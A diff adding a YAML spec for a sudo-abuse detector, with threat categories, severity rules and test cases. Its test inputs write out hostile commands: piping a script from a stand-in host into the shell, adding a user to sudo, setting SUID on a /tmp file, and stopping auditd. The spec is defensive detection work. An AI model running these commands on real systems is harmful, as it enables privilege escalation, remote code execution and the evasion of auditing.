@@ -1,0 +1,86 @@
+kind: detector
+name: sudo_abuse
+version: 1
+description: "Detects suspicious sudo command bursts classified by threat category"
+
+context: |
+  Monitors sudo.command events and classifies each command into threat
+  categories: identity_change, privilege_policy_change, suid_manipulation,
+  security_control_change, remote_script_execution, service_disruption,
+  ssh_key_injection, cron_persistence, tmp_execution, destructive_command,
+  log_tampering. Only commands matching at least one category are counted.
+
+  Severity scoring:
+  - Critical reasons (suid_manipulation, privilege_policy_change,
+    remote_script_execution, ssh_key_injection, log_tampering) or 5+ commands
+    → Critical
+  - 3+ commands or 2+ distinct reason categories → High
+  - Single non-critical reason → Medium
+
+  Key decisions:
+  - Non-suspicious sudo commands (apt update, systemctl status, journalctl)
+    are silently ignored — no count increment.
+  - Tracking is per-user, not per-IP, because sudo abuse is about insider
+    threat or compromised user sessions.
+  - Empty commands or empty usernames are skipped.
+
+behavior:
+  does:
+    - "Classifies sudo commands into 11 threat categories"
+    - "Fires when suspicious command count reaches threshold within window"
+    - "Escalates to Critical for privilege_policy_change, suid_manipulation, remote_script_execution, ssh_key_injection, log_tampering"
+    - "Escalates to Critical when 5+ suspicious commands in window"
+    - "Tracks per-user independently"
+  does_not:
+    - "Alert on non-suspicious sudo commands (apt update, systemctl status)"
+    - "Alert below threshold"
+    - "Mix command counts between different users"
+    - "Alert twice for same user within window"
+
+config:
+  threshold: 2
+  window_secs: 300
+
+dependencies: []
+
+test_cases:
+  true_positives:
+    - description: "usermod + curl|sh in rapid succession"
+      input:
+        kind: "sudo.command"
+        user: "deploy"
+        commands: ["usermod -aG sudo attacker", "curl -fsSL http://x | sh"]
+      expected:
+        alert: true
+        severity: "critical"
+
+    - description: "chmod +s on /tmp file"
+      input:
+        kind: "sudo.command"
+        user: "deploy"
+        commands: ["chmod +s /tmp/exploit", "systemctl stop auditd"]
+      expected:
+        alert: true
+        severity: "critical"
+
+  true_negatives:
+    - description: "Normal admin commands"
+      input:
+        kind: "sudo.command"
+        user: "deploy"
+        commands: ["systemctl status nginx", "journalctl -u nginx"]
+      expected:
+        alert: false
+        reason: "Non-suspicious commands are not counted"
+
+    - description: "Single suspicious command below threshold of 2"
+      input:
+        kind: "sudo.command"
+        user: "deploy"
+        commands: ["systemctl stop nginx"]
+      expected:
+        alert: false
+        reason: "service_disruption alone, but only 1 command (below threshold)"
+
+history:
+  - "2026-04-02: initial spec from source code analysis"
